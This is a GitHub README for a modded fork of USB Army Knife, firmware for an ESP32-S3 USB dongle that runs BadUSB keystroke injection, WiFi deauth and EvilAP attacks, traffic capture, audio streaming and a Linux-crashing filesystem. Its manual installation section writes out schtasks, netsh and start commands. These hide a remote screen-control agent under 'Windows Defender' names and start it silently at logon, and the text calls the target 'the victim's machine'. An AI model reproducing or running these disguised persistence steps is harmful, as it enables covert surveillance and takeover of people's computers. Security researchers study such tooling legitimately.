# USB Army Knife - modded

[![PlatformIO CI](https://github.com/Korbi0312/USBArmyKnife-modded/actions/workflows/main.yml/badge.svg)](https://github.com/Korbi0312/USBArmyKnife-modded/actions/workflows/main.yml)

Fork of [i-am-shodan/USBArmyKnife](https://github.com/i-am-shodan/USBArmyKnife), specifically tailored for the **LILYGO T-Dongle S3** (ESP32-S3). This fork adds a fully translated 18-language web interface (both themes), rock-solid file storage with byte-exact save verification, PNG display, a PC-based VNC solution and many quality-of-life improvements over the upstream project.

> 🚀 **v1.1.8-pre** — PC-based VNC (VncDirect), PC Installer/Uninstaller, Dark Theme VNC UI with FPS/quality/scaling, VNC password protection, remote access via Tailscale, pre-built firmware.

## Testimonials

"Your device is evil. You are doing evil." - Mr. Peoples via X

## Intro

There is a problem with physical access/USB attacks today. On their own, each attack doesn't provide enough of a solution to meet most objectives.

- USB keyboard attacks (Ducky, HID&Run) require a logged on machine and even the best tools don't provide a solution to this.
- Networking attacks (poison tap and alike) might get you a password hash but often require something complex hanging out of an Ethernet port to get this back for offline cracking.
- When you get on a box, what options do you still have for exfiltrating data when anything that opens a socket is getting sent to VT.

What was needed is a physical access platform that enables a suitable rogue to take the best bits of each attack and workaround their respective problems with another attack. Ideally this platform would be so cheap and covert that losing one wouldn't be an issue.

This is why I decided to create the USB Army Knife.

- Want to become a USB Ethernet adapter PCAP the interface and egress it over WiFI? USB Army Knife.
- Want to wrap your attacks in custom UI or just show a Hollywood interface when your attack has worked? USB Army Knife
- Want a covert storage device? USB Army Knife
- Want to deauth everyone on the WiFi, PCAP the renegotiation and email this to yourself when the machine has been left unlocked for offline cracking? USB Army Knife
- Want your attack to destroy itself when it's been found? USB Army Knife
- What to connect to other bits of hardware, motion sensors and alike? USB Army Knife.
- Want to view what's on the victim's screen over WiFi? USB Army Knife.
- Want to record what your victim is saying? USB Army Knife.

## Video

This video shows how the ultimate rick roll works (now with emergency reset WiFi fix):

https://github.com/user-attachments/assets/f373e18e-5cad-4871-9f2a-17523fa33398

This video shows how the USB PCAP functionality and has a brief peak at the web interface:

https://github.com/user-attachments/assets/0d5b1485-b808-46c6-aaf7-7cf016088b8f

This video shows how to pull the victims machine once the agent has been installed:

https://github.com/user-attachments/assets/3c866d29-ef26-4eaf-943b-1206b8c40101

## Features

This project implements a variety of attacks based around an easily concealable USB/WiFi/BT dongle. The attacks include sending BadUSB (USB HID commands using DuckyScript), appearing as mass storage devices, appearing as USB network devices, and performing WiFi and Bluetooth attacks with ESP32 Marauder. Attacks are deployed using a Ducky-like language you probably already know and love. This language has been augmented with a raft of custom commands and even the entire ESP32 Marauder capability (improved). Attacks include:

- **USB HID Attacks**: Send custom HID commands using DuckyScript, supports BadUSB & USB HID and run style attacks. Supports multiple keyboard layouts/languages.
- **Mass Storage Device**: Emulate a USB mass storage device (USB drive and CDROM).
- **USB Network Device**: Appear as a USB network device.
- **WiFi and Bluetooth Attacks**: Utilize ESP32 Marauder for WiFi and Bluetooth attacks. Include EvilAP, Deauth and pcap.
- **Hot Mic**: Plug in a USB device and stream audio over WiFi.

### Modded Features

| Feature | Description |
| ------- | ----------- |
| **PC-based VNC** | VncDirect hosts noVNC on port 7002 on your PC. The dongle deploys the agent — everything else runs on the PC. No relay through the dongle, full performance. |
| **PC Installer / Uninstaller** | `Agent Installer.bat` downloads all files from GitHub individually, installs to `C:\ProgramData\Windows Defender`, sets up scheduled tasks + firewall + autostart. `Agent Uninstaller.bat` with 5 options: full uninstall, toggle autostart, start/stop VNC, set password, exit. |
| **VNC Web UI (Dark Theme)** | Gold-accented dark theme matching the dashboard. FPS slider (30–240), quality selector (1440p–360p), scale selector (Fenster/100%/75%/50%/25%), remote control toggle (mouse+keyboard), resize grip. |
| **VNC Password Protection** | Password check on the VNC page — set via installer or uninstaller, verified on connect. |
| **Remote Access (Tailscale)** | Access your PC's VNC from anywhere via Tailscale VPN — no port forwarding needed. The VNC page detects your Tailscale IP and shows a remote link. |
| **Settings UI Enhancements** | Dropdown presets (VID, PID, USB version, device info, WiFi modes, TFT text size), named color picker (15 colors + custom) for boot LED, unit selector (sec/min/hr) for agent polling – in both gold and Bootstrap themes |
| **Two Themes** | Gold/modern theme (default) and original Bootstrap theme (`/index_original.html`) – both with all settings enhancements |
| **Keyboard Layout at Runtime** | Keyboard layout is now a runtime setting decoupled from the OS language switcher, with 23 layouts enabled |
| **Boot LED Fix** | Green boot LED properly turns off after startup |
| **Emergency Reset WiFi Fix** | Full `WiFi.disconnect()` + `WiFi.mode(WIFI_OFF)` before reinit – AP restores reliably even after Marauder attacks |
| **Crash LED** | Rear APA102 LED lights up solid red on ESP32 crash – instant visual feedback |
| **SD Storage** | SD card usage displayed on the dashboard |
| **File Browser** | Built-in file browser with upload/download/delete |
| **18-Language UI (i18n)** | Both web themes fully translated in 18 languages (de, en, fr, es, it, pt, nl, ja, cs, da, fi, hr, hu, no, sv, sl, sk, tr) — every button, label, placeholder, modal and status message, including language-aware keyboard layout switching |
| **Byte-Exact File Saving** | Saves are verified by the server (byte count check per 4 KB chunk, 3 retries, HTTP 507 disk-full detection with free-space display) — no more truncated/corrupt files, even on large payloads |
| **Streaming File Reads** | Large files open correctly and instantly in the editor (streamed response instead of memory-buffered) |
| **PNG Display** | Display `.png` images on the LCD via the Display button in the original UI (modern UI keeps the file browser clean) |
| **Live Microphone Toggle** | Stream microphone audio over WiFi with a live on/off toggle (WebSocket audio + `/mic` endpoint) — only shown on boards that actually have a microphone (e.g. M5Stack AtomS3U); automatically hidden on the T-Dongle S3 (no mic hardware) |
| **New-File Modal** | Create files with type, keyboard layout and typing speed presets in one dialog — in both UIs, fully translated |
| **MIT Licensed** | SPDX license headers on all 81+ source files |
| **English Only** | Full codebase translated from German to English |

## Examples

| Name | Description |
| ---- | ----------- |
| Covert Storage | Example showing how to masquerade as two different USB mass storage devices. The first time the device is plugged in the devices appears with the full contents of the micro SD card. In all subsequence attempts a different 'benign' drive appears. |
| Progress Bar | Images are displayed on the devices LCD screen showing a progress bar. Great for those Hollywood style attacks or if you want a visual indicator to show an attack has deployed. |
| Ultimate RickRoll | Inject keystrokes to display the famous rickroll video but also uses ESP32 Marauder to blast the lyrics over WiFi. |
| USB Ethernet PCAP | Turns the device into a USB network adapter and collects a PCAP of the first few seconds of network traffic. |
| Deploy the serial agent | Deploys the agent if it isn't already installed and sends commands over the serial port. Command output can be seen in the web interface |
| Pull the screen | Deploys the agent, then open VNC on your PC (`http://<PC-IP>:7002`) to view the victim's screen in real-time. |
| Simple UI | A simple yet powerful UI to select scripts/images and run these using the hardware button. Shows how you can build complex UI interactions simply. |
| Stream Mic audio over WiFi | The M5Stack AtomS3U has a microphone that you can stream over WiFi. |
| Instantly crash Linux boxes | Deploy a bad filesystem which cause Linux machines which automount to panic. |
| Evil USB CDROM/NIC | Pretend to be a USB NICs which requires a driver from a CDROM device that appears when you plug the NIC in. |
| Use different keyboard layouts | Automatically support different keyboard layouts without rewriting your payloads |

## Supported Hardware

| Hardware | Description | Purchase Links |
| -------- | ----------- | -------------- |
| **LilyGo T-Dongle S3** (Recommended) ![screenshot](./docs/images/t-dongle-s3.png) | The LilyGo T-Dongle S3 is a USB pen drive shaped ESP32-S3 development board. It features a colour LCD screen, physical button, hidden/covert micro SD card adapter (inside the USB-A connector) as well as a SPI adapter. It has 16MB of flash. It is based on the ESP32-S3 chipset which enables it to host a WiFi station as well as support a range of WiFi and Bluetooth attacks. It is incredibly cheap! There are two versions of this device with and without the screen. Only the version with the screen has been tested. | [AliExpress](https://www.aliexpress.com) · [Amazon UK](https://www.amazon.co.uk) · [Amazon US](https://www.amazon.com) · [eBay UK](https://www.ebay.co.uk) |

## Getting Started

 firstly please check the [wiki](https://github.com/Korbi0312/USBArmyKnife-modded/wiki) for a step by step guide and all manner of advice for getting started.

### Option 1: Flash Pre-Built Firmware (Easiest)

1. Download the firmware zip from the [Releases](https://github.com/Korbi0312/USBArmyKnife-modded/releases) page
2. Flash using the [web installer](https://esp.huhn.me/) or [esptool](https://github.com/espressif/esptool)
3. Install the agent: download `Agent Installer.bat` from `tools/`, right-click → Run as administrator

### Option 2: Build from Source

```bash
# Install PlatformIO, then:
platformio run --environment LILYGO-T-Dongle-S3
# Or upload directly:
platformio run -t upload --upload-port COM4 --environment LILYGO-T-Dongle-S3
```

### Agent Installation

All files needed for the PC agent are in [`tools/`](https://github.com/Korbi0312/USBArmyKnife-modded/tree/master/tools).

#### Option A: Installer (Recommended)

1. Download [`Agent Installer.bat`](https://raw.githubusercontent.com/Korbi0312/USBArmyKnife-modded/master/tools/Agent%20Installer.bat) (right-click → "Save link as...")
2. Save it anywhere on your PC (e.g. Desktop)
3. Right-click → **Run as administrator**
4. Enter a VNC password (optional, press Enter to skip)
5. The installer downloads all files from GitHub, installs to `C:\ProgramData\Windows Defender`, sets up scheduled tasks, firewall and autostart
6. After installation, open `http://<your-pc-ip>:7002` in any browser to access the VNC interface

To uninstall, run `Agent Uninstaller.bat` and choose:
- **[1] Full Uninstall** — removes autostart, all files and firewall rules
- **[2] Remove Autostart / Setup Autostart** — toggle scheduled tasks
- **[3] Start/Stop VNC Server** — start or stop the VNC server
- **[4] Set/Change VNC Password** — set or clear the VNC password
- **[5] Exit**

#### Option B: Manual Installation (if installer doesn't work)

If the installer fails (e.g. no internet, corporate firewall), set up the agent manually:

1. Download all files from [`tools/Installer/`](https://github.com/Korbi0312/USBArmyKnife-modded/tree/master/tools/Installer)
2. Create `C:\ProgramData\Windows Defender` and `C:\ProgramData\Windows Defender\VncDirect\vnc` on your PC
3. Copy files into `C:\ProgramData\Windows Defender`:
   - `AgentLauncher.exe`
   - `WinDefend.bat`
4. Copy `Windows Defender.exe` (VncDirect), `turbojpeg.dll`, `vcruntime140.dll` into `C:\ProgramData\Windows Defender\VncDirect\`
5. Extract `vnc-web.zip` into `C:\ProgramData\Windows Defender\VncDirect\` (creates the `vnc\` folder)
6. Create the scheduled tasks (run as admin):
   ```
   schtasks /create /tn "USBArmyKnife Agent" /tr "C:\ProgramData\Windows Defender\AgentLauncher.exe vid=cafe pid=403f cwd=C:\ProgramData\Windows Defender" /sc onlogon /rl limited /f
   schtasks /create /tn "Security Script" /tr "C:\ProgramData\Windows Defender\AgentLauncher.exe vid=cafe pid=403f cwd=C:\ProgramData\Windows Defender" /sc onlogon /rl limited /f
   schtasks /create /tn "Windows Defender" /tr "wscript.exe \"C:\ProgramData\Windows Defender\WinDefend.vbs\"" /sc onlogon /rl limited /f
   ```
7. Add firewall rules (run as admin):
   ```
   netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002
   netsh advfirewall firewall add rule name="VNC Block Localhost" dir=in action=block protocol=TCP localport=7002 remoteip=127.0.0.1
   ```
8. Start the services:
   ```
   cd /d C:\ProgramData\Windows Defender\VncDirect\vnc
   start "" "C:\ProgramData\Windows Defender\VncDirect\Windows Defender.exe" port=7002 "cwd=C:\ProgramData\Windows Defender\VncDirect\vnc" fps=360 scale=0
   C:\ProgramData\Windows Defender\AgentLauncher.exe vid=cafe pid=403f cwd=C:\ProgramData\Windows Defender
   ```

#### Compile Agent from Source

The agent is compiled into Windows native instructions. Cross compilation is not currently supported by dotnet so you'll need to run these steps on a Windows machine.

```bash
# Install .NET 8.0 SDK first, then:
cd tools/AgentLauncher
dotnet publish -r win-x64 -c Release

cd ../Agent
dotnet publish -r win-x64 -c Release

cd ../VncDirect
dotnet publish -r win-x64 -c Release --self-contained true /p:PublishSingleFile=true
```

The compiled binaries are in `tools/AgentLauncher/bin/Release/net8.0-windows/win-x64/publish/` and `tools/Agent/bin/Release/net8.0-windows/win-x64/publish/`.

## Usage

1. Plug the T-Dongle S3 into a USB port
2. Connect to the WiFi access point `iPhone14` with the password `password`
3. Access the web interface at http://4.3.2.1:8080
4. Ensure the web interface has correctly loaded. You should see the currently running status and uptime. If not refresh the page.
5. Use the web interface to create and manage your attacks using DuckyScript.

## VNC / Remote Screen Viewing

Once the agent is deployed to the victim's machine, you can view their screen in real-time:

1. Open `http://<your-pc-ip>:7002` in any browser
2. The VNC interface connects to the agent running on the victim's PC
3. Toggle mouse+keyboard control on/off with the Remote Control button
4. The canvas auto-scales to your browser window size

### Autostart

A scheduled task "Windows Defender" runs `WinDefend.vbs` on login, which starts the VNC server hidden in the background.

### Remote Access via Tailscale

To access the VNC from outside your local network (e.g. from another country):

1. Install [Tailscale](https://tailscale.com/) on both your PC and the device you want to connect from
2. The VNC page automatically detects your Tailscale IP (100.x.x.x) and shows a remote link
3. No port forwarding needed — Tailscale creates a secure VPN tunnel between your devices

## How to Get Help

- **Questions about DuckyScript?**
  - [DuckyScript quick reference](https://github.com/i-am-shodan/USBArmyKnife/wiki/DuckyScript-Quick-Reference)
  - [The USB Army Knife command reference](https://github.com/i-am-shodan/USBArmyKnife/wiki/Command-Reference)
- **Problem getting started?**
  - Check out the [examples](https://github.com/i-am-shodan/USBArmyKnife/tree/master/examples)
  - The [discussions pages](https://github.com/i-am-shodan/USBArmyKnife/discussions)
- **Found a bug?**
  - Create an [issue](https://github.com/Korbi0312/USBArmyKnife-modded/issues)

## Upstream Contribution Branch

C++ core changes (no UI) are maintained in a separate branch for potential upstream PR:
[settings-pr-v2](https://github.com/Korbi0312/USBArmyKnife-modded/tree/settings-pr-v2)

## Future plans

### USB Host Mode / Mobile device support

There is no reason the USB Army Knife can't also operate in USB host mode. That is the same mode a computer works in. In this way the USB Army Knife can issue commands as if it was a computer. With most smart phones supporting PTP (picture transfer protocol) this means you could in theory plug in a USB Army Knife (with a USB adapter) into a phone and have it pull the photos off.

Espressif have documentation for USB host mode and also example code. They do not have an example for the PTP protocol. You can collect a PCAP of your phone using PTP using USB PCAP there is even a WireShark dissector.

## Contributing

Contributions are welcome! Please fork the repository and submit a pull request.

## Contact

If you have any questions or suggestions, feel free to reach out:

- Raise an issue on the repository: [GitHub Repository](https://github.com/Korbi0312/USBArmyKnife-modded/issues)
- Original project on Twitter: [@therealshodan](https://twitter.com/therealshodan)

## License

MIT License – see [LICENSE](LICENSE)

Original project: https://github.com/i-am-shodan/USBArmyKnife

## Acknowledgments

- Inspired by various BadUSB projects and the ESP32 Marauder project.
- Based on the excellent [USB Army Knife](https://github.com/i-am-shodan/USBArmyKnife) by i-am-shodan.

## Star History

[![Star History Chart](https://api.star-history.com/svg?repos=Korbi0312/USBArmyKnife-modded&type=Date)](https://star-history.com/#Korbi0312/USBArmyKnife-modded&Date)
